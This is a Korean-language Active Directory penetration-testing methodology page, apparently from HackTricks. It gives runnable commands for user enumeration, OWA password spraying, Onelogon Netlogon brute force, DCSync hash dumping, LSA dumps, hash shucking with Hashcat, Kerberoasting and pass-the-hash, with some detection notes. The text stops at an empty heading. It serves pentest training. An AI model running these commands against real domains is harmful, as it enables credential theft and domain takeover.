# Active Directory 방법론

{{#include ../../banners/hacktricks-training.md}}

## 기본 개요

**Active Directory**는 **네트워크 관리자**가 네트워크 내에서 **도메인**, **사용자** 및 **객체**를 효율적으로 생성하고 관리할 수 있도록 지원하는 기반 기술입니다. 이 기술은 확장성을 고려해 설계되었으며, 많은 수의 사용자를 관리 가능한 **그룹** 및 **하위 그룹**으로 구성하고 여러 수준에서 **접근 권한**을 제어할 수 있도록 합니다.

**Active Directory**의 구조는 세 가지 주요 계층인 **도메인**, **트리** 및 **포리스트**로 구성됩니다. **도메인**은 공통 데이터베이스를 공유하는 **사용자** 또는 **디바이스**와 같은 객체의 집합입니다. **트리**는 공통 구조로 연결된 이러한 도메인의 그룹이며, **포리스트**는 **트러스트 관계**를 통해 상호 연결된 여러 트리의 집합으로, 조직 구조의 최상위 계층을 형성합니다. 각 계층에서 특정 **접근** 및 **통신 권한**을 지정할 수 있습니다.

**Active Directory**의 주요 개념은 다음과 같습니다.

1. **Directory** – Active Directory 객체와 관련된 모든 정보를 보관합니다.
2. **Object** – **사용자**, **그룹** 또는 **공유 폴더**를 포함한 디렉터리 내의 엔터티를 의미합니다.
3. **Domain** – 디렉터리 객체를 담는 컨테이너로, **포리스트** 내에 여러 도메인이 존재할 수 있으며 각 도메인은 자체 객체 집합을 유지합니다.
4. **Tree** – 공통 루트 도메인을 공유하는 도메인의 그룹입니다.
5. **Forest** – 여러 트리로 구성되고 트리 간에 **트러스트 관계**가 존재하는 Active Directory 조직 구조의 최상위 계층입니다.

**Active Directory Domain Services (AD DS)**는 네트워크 내 중앙 집중식 관리 및 통신에 중요한 다양한 서비스를 포함합니다. 이러한 서비스는 다음과 같습니다.

1. **Domain Services** – 데이터를 중앙 집중식으로 저장하고 **사용자**와 **도메인** 간 상호 작용을 관리하며, **인증** 및 **검색** 기능을 포함합니다.
2. **Certificate Services** – 보안 **디지털 인증서**의 생성, 배포 및 관리를 담당합니다.
3. **Lightweight Directory Services** – **LDAP 프로토콜**을 통해 디렉터리 사용 애플리케이션을 지원합니다.
4. **Directory Federation Services** – 단일 세션에서 여러 웹 애플리케이션에 걸쳐 사용자를 인증할 수 있는 **싱글 사인온** 기능을 제공합니다.
5. **Rights Management** – 저작권 자료의 무단 배포 및 사용을 규제하여 보호하는 데 도움을 줍니다.
6. **DNS Service** – **도메인 이름** 확인에 필수적입니다.

더 자세한 설명은 다음을 참고하세요: [**TechTerms - Active Directory 정의**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

AD를 **공격**하는 방법을 배우려면 **Kerberos 인증 프로세스**를 정말 잘 **이해해야** 합니다.\
[**아직 작동 방식을 모른다면 이 페이지를 읽어보세요.**](kerberos-authentication.md)

## Cheat Sheet

[https://wadcoms.github.io/](https://wadcoms.github.io)에서 AD를 열거하거나 exploit하는 데 사용할 수 있는 명령을 빠르게 확인할 수 있습니다.

> [!WARNING]
> Kerberos 통신은 일반적으로 클라이언트가 올바른 SPN에 대한 티켓을 얻을 수 있도록 **정규화된 도메인 이름(FQDN)**을 필요로 합니다. IP 주소로 시스템에 접근하면 Kerberos 대신 NTLM으로 대체되는 경우가 많습니다.

## AD 정찰 (자격 증명/세션 없음)

AD 환경에 접근할 수 있지만 자격 증명/세션이 없다면 다음을 수행할 수 있습니다.

- **네트워크 Pentest:**
- 네트워크를 스캔하고, 시스템과 열린 포트를 찾은 다음, **취약점을 exploit**하거나 해당 시스템에서 **자격 증명을 추출**합니다(예: [프린터는 매우 흥미로운 대상이 될 수 있습니다](ad-information-in-printers.md)).
- DNS를 열거하면 웹, 프린터, 공유, VPN, 미디어 등 도메인의 주요 서버에 대한 정보를 얻을 수 있습니다.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 이를 수행하는 방법에 대한 자세한 내용은 일반 [**Pentesting 방법론**](../../generic-methodologies-and-resources/pentesting-methodology.md)을 참고하세요.
- **SMB 서비스에서 null 및 Guest 접근 확인** (최신 Windows 버전에서는 작동하지 않습니다):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB 서버를 열거하는 방법에 대한 자세한 가이드는 여기에서 확인할 수 있습니다.


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ldap 열거**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP를 열거하는 방법에 대한 자세한 가이드는 여기에서 확인할 수 있습니다 (**익명 접근에 특별히 주의하세요**).


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **네트워크 Poison**
- [**Responder로 서비스를 impersonate하여**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 자격 증명 수집
- [**relay attack을 악용하여**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 호스트 접근
- [**evil-S**로 가짜 UPnP 서비스를 **노출하여**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) 자격 증명 수집
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 내부 문서, 소셜 미디어, 도메인 환경 내부의 서비스(주로 웹) 및 공개적으로 이용 가능한 정보에서 사용자 이름/이름을 추출합니다.
- 회사 직원의 전체 이름을 찾았다면 다양한 AD **사용자 이름 규칙 (**[**여기를 읽어보세요**](https://activedirectorypro.com/active-directory-user-naming-convention/))을 시도할 수 있습니다. 가장 일반적인 규칙은 다음과 같습니다: _NameSurname_, _Name.Surname_, _NamSur_ (각각 3글자), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 무작위 _문자 3개와 무작위 숫자 3개_ (abc123).
- 도구:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 사용자 열거

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 및 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 페이지를 확인하세요.
- **Kerbrute enum**: **유효하지 않은 사용자 이름이 요청되면** 서버는 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ **Kerberos error** 코드를 사용해 응답하므로 사용자 이름이 유효하지 않음을 확인할 수 있습니다. **유효한 사용자 이름**의 경우 AS-REP 응답에서 **TGT**를 반환하거나 _KRB5KDC_ERR_PREAUTH_REQUIRED_ 오류를 반환합니다. 이는 해당 사용자가 pre-authentication을 수행해야 함을 의미합니다.
- **MS-NRPC에 대한 인증 없음**: 도메인 컨트롤러의 MS-NRPC(Netlogon) 인터페이스에 auth-level = 1(인증 없음)을 사용합니다. 이 방법은 MS-NRPC 인터페이스에 바인딩한 후 `DsrGetDcNameEx2` 함수를 호출하여 자격 증명 없이 사용자 또는 컴퓨터가 존재하는지 확인합니다. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 도구는 이러한 유형의 열거를 구현합니다. 관련 연구는 [여기](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>에서 확인할 수 있습니다.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

네트워크에서 이러한 서버 중 하나를 발견했다면 해당 서버를 대상으로 **user enumeration**을 수행할 수도 있습니다. 예를 들어 [**MailSniper**](https://github.com/dafthack/MailSniper) 도구를 사용할 수 있습니다:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> [**이 github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)와 이 저장소([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames))에서 username 목록을 확인할 수 있습니다.
>
> 하지만 이 작업 전에 수행했어야 하는 recon 단계에서 **회사에서 근무하는 사람들의 이름**을 확보했어야 합니다. 이름과 성을 사용하면 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 스크립트로 유효할 가능성이 있는 username을 생성할 수 있습니다.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

DC에 **Zerologon** 패치를 적용한 후에도 명시적으로 allow-list에 등록된 계정은 **legacy/vulnerable Netlogon secure-channel 동작**에 여전히 노출될 수 있습니다. 위험한 구성은 GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** 또는 이에 대응하는 registry 값 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**입니다.

해당 값은 **SDDL security descriptor**입니다([Security Descriptors](security-descriptors.md) 참조). DACL에서 관련 ACE가 부여된 모든 account 또는 group을 대상으로 삼을 수 있습니다. 예를 들어 `O:BAG:BAD:(A;;RC;;;WD)`는 사실상 **Everyone**을 allow-list에 등록합니다.

실제 operator workflow:

1. **SYSVOL/GPO**와 **live DC registry**를 모두 확인하여 allow-list에 등록된 principal을 식별합니다.
2. SDDL에서 발견한 SID를 실제 AD users/computers로 resolve하고 **DC machine accounts**, **trust accounts** 및 기타 privileged machines을 우선순위로 지정합니다.
3. allow-list에 등록된 account로 **MS-NRPC / Netlogon authentication**을 반복적으로 시도합니다.
4. 유효한 추측에 성공한 후 **Netlogon password-setting**을 악용하여 대상 account의 password를 reset합니다(공개 PoC는 이를 empty string으로 설정합니다).<sup>[[9]](#references)[[10]](#references)</sup>

공개 artifact의 quick triage / lab examples:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- **scanner**가 유용한 이유는 유효한 allow-list가 **SYSVOL**, **registry** 또는 둘 모두에 존재할 수 있기 때문입니다.
- 취약한 계정이 식별된 후에는 exploit path 자체가 중요합니다. **Domain Admin privileges**가 필요하지 않기 때문입니다.
- `DC$`와 같은 **Domain Controller machine account**를 Compromise하는 것은 특히 위험합니다. 해당 password를 reset하면 더 광범위한 **AD takeover** path가 직접 활성화될 수 있습니다.
- **Brute-force feasibility**는 mode에 따라 달라집니다. 공개 artifact에는 meet-in-the-middle 방식, 다른 computer account를 사용할 수 있을 때의 **24-bit** brute force, 그리고 더 느린 **32-bit** variants가 설명되어 있습니다.

Detection / hardening notes:

- allow-list policy를 audit하고, 일시적이며 명시적으로 필요한 compatibility exception을 제외한 모든 항목을 제거합니다.
- DC **System** events **5827/5828/5829/5830/5831**을 모니터링하여 취약한 Netlogon connections가 거부되거나, 발견되거나, policy에 의해 명시적으로 허용되는 상황을 탐지합니다.
- `VulnerableChannelAllowList`의 accounts는 legacy dependency가 제거될 때까지 **high-risk**로 취급합니다.

### 하나 이상의 username을 알고 있는 경우

이미 유효한 username을 알고 있지만 password가 없는 경우에는 다음을 시도합니다:

- [**ASREPRoast**](asreproast.md): 사용자가 _DONT_REQ_PREAUTH_ attribute를 **가지고 있지 않다면**, 해당 사용자를 위한 **AS_REP message**를 **request**할 수 있습니다. 이 message에는 사용자의 password에서 derivation된 값으로 encrypt된 일부 data가 포함됩니다.
- [**Password Spraying**](password-spraying.md): 발견된 각 user에게 가장 **common passwords**를 시도합니다. 일부 user가 취약한 password를 사용하고 있을 수 있습니다(password policy를 유의하세요!).
- **OWA servers**에도 spray하여 users의 mail servers에 access할 수 있는지 시도할 수 있습니다.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

다음 **network** protocols 중 일부를 **poisoning**하여 crack할 수 있는 challenge **hashes**를 **obtain**할 수 있을지도 모릅니다:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration은 usernames, email identifiers 및 naming patterns, candidate hosts, 그리고 authentication하도록 coerce할 수 있는 services를 제공합니다. 이 context를 사용하여 실행 가능한 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 및 AD environment로 진입할 수 있는 potential paths를 식별합니다.

### NetExec workspace-driven recon & relay posture checks

- **`nxcdb` workspaces**를 사용하여 engagement별 AD recon state를 유지합니다. `workspace create <name>`은 `~/.nxc/workspaces/<name>` 아래에 protocol별 SQLite DBs(smb/mssql/winrm/ldap/etc)를 생성합니다. `proto smb|mssql|winrm`으로 views를 전환하고 `creds`로 수집된 secrets를 나열합니다. 완료 후 sensitive data를 수동으로 purge합니다: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`**를 사용한 빠른 subnet discovery로 **domain**, **OS build**, **SMB signing requirements**, **Null Auth**를 확인할 수 있습니다. `(signing:False)`를 표시하는 members는 **relay-prone**이며, DCs는 대개 signing을 요구합니다.
- targeting을 쉽게 하기 위해 NetExec output에서 직접 **/etc/hosts의 hostnames**를 생성합니다:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to the DC가 signing으로 차단된 경우에도** **LDAP** posture를 확인합니다: `netexec ldap <dc>`는 `(signing:None)` / weak channel binding을 표시합니다. SMB signing이 required이지만 LDAP signing이 disabled인 DC는 **SPN-less RBCD**와 같은 abuse에 사용할 수 있는 실행 가능한 **relay-to-LDAP** target으로 남습니다.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs에 **masked admin passwords가 HTML에 삽입되어 있는 경우가 있습니다**. 소스/DevTools를 확인하면 cleartext가 노출될 수 있으며(예: `<input value="<password>">`), 이를 통해 scan/print repositories에 Basic-auth로 접근할 수 있습니다.
- 가져온 print jobs에는 사용자별 passwords가 포함된 **plaintext onboarding docs**가 있을 수 있습니다. 테스트할 때는 pairing을 서로 맞게 유지합니다:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

**null 또는 guest user**로 **다른 PC 또는 share에 액세스**할 수 있다면, 어떻게든 액세스될 경우 **사용자를 대상으로 NTLM authentication을 트리거**하는 파일(예: SCF file)을 **배치**하여 **NTLM challenge를 steal**하고 crack할 수 있습니다:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**은 이미 보유한 모든 NT hash를 key material이 NT hash에서 직접 파생되는, 더 느린 다른 형식의 candidate password로 취급합니다. Kerberos RC4 ticket, NetNTLM challenge 또는 cached credential에서 긴 passphrase를 brute-force하는 대신, NT hash를 Hashcat의 NT-candidate mode에 입력하여 plaintext를 알아내지 않고도 password reuse 여부를 검증할 수 있습니다. 이는 수천 개의 current 및 historical NT hash를 수집할 수 있는 domain compromise 이후 특히 강력합니다.<sup>[[5]](#references)</sup>

다음과 같은 경우 shucking을 사용합니다:

- DCSync, SAM/SECURITY dump 또는 credential vault에서 가져온 NT corpus가 있고 다른 domain/forest에서 reuse 여부를 테스트해야 하는 경우
- RC4 기반 Kerberos material(`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM response 또는 DCC/DCC2 blob을 capture한 경우
- 길고 crack할 수 없는 passphrase의 reuse를 빠르게 입증하고 즉시 Pass-the-Hash로 pivot하려는 경우

이 technique은 key가 NT hash가 아닌 encryption type에는 작동하지 않습니다(예: Kerberos etype 17/18 AES). domain이 AES-only를 적용하는 경우 일반 password mode로 되돌아가야 합니다.

#### NT hash corpus 구축

- **DCSync/NTDS** – history를 사용하여 가능한 가장 많은 NT hash와 이전 값을 가져오려면 `secretsdump.py`를 사용합니다:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entry는 Microsoft가 account당 최대 24개의 이전 hash를 저장할 수 있으므로 candidate pool을 크게 확장합니다. NTDS secret을 수집하는 다른 방법은 다음을 참조하세요:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dump** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`(또는 Mimikatz `lsadump::sam /patch`)는 local SAM/SECURITY data와 cached domain logon(DCC/DCC2)을 추출합니다. 해당 hash의 중복을 제거하고 같은 `nt_candidates.txt` list에 추가합니다.
- **Metadata 추적** – 각 hash를 생성한 username/domain을 기록해 둡니다(wordlist에 hex만 포함되어 있더라도). Hashcat이 winning candidate를 출력하면 일치하는 hash를 통해 어떤 principal이 password를 reuse하는지 즉시 확인할 수 있습니다.
- shucking 시 겹칠 가능성을 극대화하려면 같은 forest 또는 trusted forest의 candidate를 우선 사용합니다.

#### Hashcat NT-candidate mode

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

참고:

- NT-candidate input은 **raw 32-hex NT hash로 유지되어야 합니다**. Rule engine을 비활성화해야 합니다(`-r` 사용 금지, hybrid mode 사용 금지). 변형 작업이 candidate key material을 손상시키기 때문입니다.
- 이 mode가 본질적으로 더 빠른 것은 아니지만, NTLM keyspace(~30,000 MH/s on an M3 Max)는 Kerberos RC4(~300 MH/s)보다 약 100배 빠릅니다. 선별된 NT list를 테스트하는 것이 느린 형식에서 전체 password space를 탐색하는 것보다 훨씬 저렴합니다.
- 항상 **최신 Hashcat build**(`git clone https://github.com/hashcat/hashcat && make install`)를 사용하세요. mode 31500/31600/35300/35400은 최근에 추가되었습니다.<sup>[[7]](#references)</sup>
- 현재 AS-REQ Pre-Auth용 NT mode는 없으며, AES etype(19600/19700)는 raw NT hash가 아닌 UTF-16LE password에서 PBKDF2를 통해 key를 파생하므로 plaintext password가 필요합니다.

#### Example – Kerberoast RC4 (mode 35300)

1. low-privileged user로 target SPN의 RC4 TGS를 capture합니다(자세한 내용은 Kerberoast page 참조):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. NT list를 사용하여 ticket을 shuck합니다:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat은 각 NT candidate에서 RC4 key를 파생하고 `$krb5tgs$23$...` blob을 검증합니다. match가 확인되면 service account가 기존 NT hash 중 하나를 사용하고 있다는 뜻입니다.

3. 즉시 PtH를 통해 pivot합니다:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

필요하다면 나중에 `hashcat -m 1000 <matched_hash> wordlists/`를 사용하여 plaintext를 복구할 수 있습니다.

#### Example – Cached credentials (mode 31600)

1. compromised workstation에서 cached logon을 dump합니다:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 관심 있는 domain user의 DCC2 line을 `dcc2_highpriv.txt`에 복사한 후 shuck합니다:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 성공적인 match는 list에 이미 알려진 NT hash를 반환하며, cached user가 password를 reuse하고 있음을 입증합니다. 이를 PtH에 직접 사용하거나(`nxc smb <dc_ip> -u highpriv -H <hash>`) 빠른 NTLM mode에서 brute-force하여 string을 복구할 수 있습니다.

정확히 동일한 workflow를 NetNTLM challenge-response(`-m 27000/27100`) 및 DCC(`-m 31500`)에도 적용할 수 있습니다. match가 확인되면 relay, SMB/WMI/WinRM PtH를 실행하거나 offline에서 mask/rule을 사용하여 NT hash를 다시 crack할 수 있습니다.



## Credentials/session을 사용한 Active Directory 열거

이 단계에서는 **유효한 domain account의 credentials 또는 session을 compromise한 상태여야 합니다.** 유효한 credential 또는 domain user shell이 있다면 **앞에서 제시한 option도 여전히 다른 user를 compromise하는 데 사용할 수 있음**을 기억해야 합니다.

Authenticated enumeration을 시작하기 전에 **Kerberos double-hop problem**을 이해해야 합니다.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Account를 compromise하는 것은 **domain을 평가하는 데 있어 중요한 단계**입니다. 이를 통해 authenticated **Active Directory enumeration**이 가능해집니다:

[**ASREPRoast**](asreproast.md)의 경우 이제 취약할 가능성이 있는 모든 user를 찾을 수 있으며, [**Password Spraying**](password-spraying.md)의 경우 **모든 username의 list**를 가져와 compromised account의 password, 빈 password 및 새롭게 유망한 password를 시도할 수 있습니다.

- [**CMD를 사용하여 기본 recon 수행**](../basic-cmd-for-pentesters.md#domain-info)을 할 수 있습니다.
- [**powershell을 recon에 사용**](../basic-powershell-for-pentesters/index.html)할 수도 있으며, 이 방법이 더 stealthy합니다.
- [**powerview를 사용**](../basic-powershell-for-pentesters/powerview.md)하여 더 자세한 정보를 추출할 수도 있습니다.
- Active Directory recon을 위한 또 다른 훌륭한 tool은 [**BloodHound**](bloodhound.md)입니다. (사용하는 collection method에 따라) **매우 stealthy하지는 않지만**, 이에 **신경 쓰지 않는다면** 반드시 사용해 보세요. 어떤 user가 RDP할 수 있는지, 다른 group으로 가는 path 등을 찾을 수 있습니다.
- **기타 automated AD enumeration tool:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- 흥미로운 정보를 포함할 수 있는 [**AD의 DNS record**](ad-dns-records.md).
- directory를 열거하는 데 사용할 수 있는 **GUI tool**은 **SysInternal** Suite의 **AdExplorer.exe**입니다.
- **ldapsearch**를 사용하여 LDAP database에서 _userPassword_ 및 _unixUserPassword_ field의 credential 또는 _Description_을 검색할 수도 있습니다. 다른 방법은 PayloadsAllTheThings의 [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)를 참조하세요.
- **Linux**를 사용한다면 [**pywerview**](https://github.com/the-useless-one/pywerview)를 사용하여 domain을 열거할 수도 있습니다.
- 다음과 같은 automated tool도 시도할 수 있습니다:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **모든 domain user 추출**

Windows에서 모든 domain username을 가져오는 것은 매우 쉽습니다(`net user /domain`, `Get-DomainUser` 또는 `wmic useraccount get name,sid`). Linux에서는 다음을 사용할 수 있습니다: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 또는 `enum4linux -a -u "user" -p "password" <DC IP>`

> 이 Enumeration section이 짧아 보이더라도 전체 과정에서 가장 중요한 부분입니다. link(CMD, powershell, powerview 및 BloodHound link)를 열어 domain을 열거하는 방법을 배우고 익숙해질 때까지 연습하세요. assessment 중에는 DA로 가는 방법을 찾거나 아무것도 할 수 없다고 판단하는 핵심 순간이 됩니다.

### Kerberoast

Kerberoasting은 user account에 연결된 service가 사용하는 **TGS ticket**을 획득하고, user password를 기반으로 하는 encryption을 **offline**에서 crack하는 과정입니다.

자세한 내용은 다음을 참조하세요:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

credential을 확보했다면 **machine**에 액세스할 수 있는지 확인할 수 있습니다. 이를 위해 port scan 결과에 따라 **CrackMapExec**을 사용하여 서로 다른 protocol로 여러 server에 연결을 시도할 수 있습니다.

### Local Privilege Escalation

regular domain user로서 compromised credential 또는 session이 있고 **domain 내 어떤 machine에든 액세스**할 수 있다면, local privilege를 **escalate하고 credential을 수집할** path를 찾으세요. Local administrator privilege를 사용하면 memory(LSASS)와 local storage(SAM)에서 **다른 user의 hash를 dump**할 수 있습니다.

이 책에는 [**Windows의 local privilege escalation**](../windows-local-privilege-escalation/index.html)과 [**checklist**](../checklist-windows-privilege-escalation.md)에 대한 별도 page가 있습니다. 또한 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)를 사용하는 것도 잊지 마세요.

### Current Session Tickets

현재 user에게 **예상하지 못한 resource에 액세스할 permission을 제공하는** **ticket**을 발견할 가능성은 매우 **낮지만**, 다음을 확인해 볼 수 있습니다:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

도메인 credentials 또는 user session이 있다면 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)를 다시 확인하세요. authenticated enumeration 및 coercion techniques를 사용하면 unauthenticated reconnaissance 중에는 사용할 수 없었던 relay 경로가 노출될 수 있습니다.

### Looks for Creds in Computer Shares | SMB Shares

이제 몇 가지 기본 credentials를 확보했으므로 **AD 내부에서 공유되고 있는** **흥미로운 파일을 찾을 수 있는지** 확인해야 합니다. 수동으로 수행할 수도 있지만 매우 지루하고 반복적인 작업입니다(확인해야 할 문서를 수백 개 발견한다면 더욱 그렇습니다).

[**사용할 수 있는 tools에 대해 알아보려면 이 링크를 따라가세요.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

**다른 PC 또는 shares에 access할 수 있다면**, SCF file과 같은 **files를 배치**할 수 있습니다. 해당 파일에 어떻게든 access하면 **당신을 상대로 NTLM authentication을 trigger**하므로 **NTLM challenge를 steal**하여 crack할 수 있습니다:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

이 vulnerability를 통해 authenticated user라면 누구나 **domain controller를 compromise**할 수 있었습니다.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**다음 techniques의 경우 regular domain user만으로는 충분하지 않으며, 이러한 attacks를 수행하려면 일부 특수 privileges/credentials가 필요합니다.**

### Hash extraction

[AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), relaying을 포함한 [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [로컬 privilege escalation](../windows-local-privilege-escalation/index.html)을 사용하여 일부 local admin account를 **compromise**하는 데 성공했기를 바랍니다.\
이제 memory 및 local에 있는 모든 hashes를 dump할 시간입니다.\
[**hashes를 얻는 다양한 방법에 대한 이 페이지를 읽어보세요.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**user의 hash를 확보하면**, 이를 사용하여 해당 user를 **impersonate**할 수 있습니다.\
해당 **hash를 사용하여 NTLM authentication을 수행할** **tool**을 사용해야 하며, 또는 새로운 **sessionlogon**을 생성하고 해당 **hash를 LSASS 내부에 inject**할 수도 있습니다. 그러면 **NTLM authentication이 수행될 때마다** 해당 **hash가 사용됩니다.** 마지막 방법이 mimikatz가 수행하는 방식입니다.\
[**자세한 내용은 이 페이지를 읽어보세요.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

